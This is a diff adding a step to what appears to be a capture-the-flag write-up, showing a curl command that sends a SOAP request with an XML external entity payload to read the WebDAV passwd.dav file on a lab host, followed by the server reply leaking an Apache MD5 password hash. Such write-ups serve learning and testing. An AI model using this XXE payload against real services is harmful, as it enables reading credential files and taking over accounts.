@@ -72,5 +72,47 @@ xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
 
 ```
 
-it works!!
+it works!! let's now try to steal the WebDAV `passwd.dav` file.
 
+
+
+
+```zsh
+
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY stolen SYSTEM "file:///var/www/html/webdav/passwd.dav">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&stolen;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
+
+
+```
+
+reply:
+
+```
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+    <ns:checkoutResponse>
+      <result>Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</result>
+    </ns:checkoutResponse>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+                                                                                                          
+```
